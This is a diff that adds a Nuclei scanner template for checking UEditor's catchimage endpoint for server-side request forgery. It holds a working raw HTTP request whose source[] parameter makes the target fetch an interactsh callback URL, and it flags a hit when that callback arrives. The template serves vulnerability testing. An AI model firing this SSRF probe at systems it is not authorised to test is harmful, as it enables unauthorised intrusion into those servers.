@@ -1,0 +1,38 @@
+id: ueditor-catchimage-ssrf
+
+info:
+  name: UEditor Catchimage SSRF Vulnerability
+  author: ChiragArtani
+  severity: high
+  description: Tests for SSRF vulnerability in UEditor's catchimage functionality
+  tags: ssrf,ueditor,oast
+
+requests:
+  - name: ueditor-catchimage-ssrf
+
+    # Use raw HTTP format for older Nuclei versions
+    raw:
+      - |
+        GET {{BaseURL}}/laravel-u-editor-server/server?action=catchimage&source[]=http://{{interactsh-url}}/test.jpg HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFRBCcbPpYK8Axzip
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
+        X_requested_with: XMLHttpRequest
+        Accept: */*
+        Origin: {{BaseURL}}
+        Referer: {{BaseURL}}/laravel-u-editor/dialogs/image/image.html
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+          - "dns"
+        condition: or
+
+      - type: status
+        status:
+          - 200
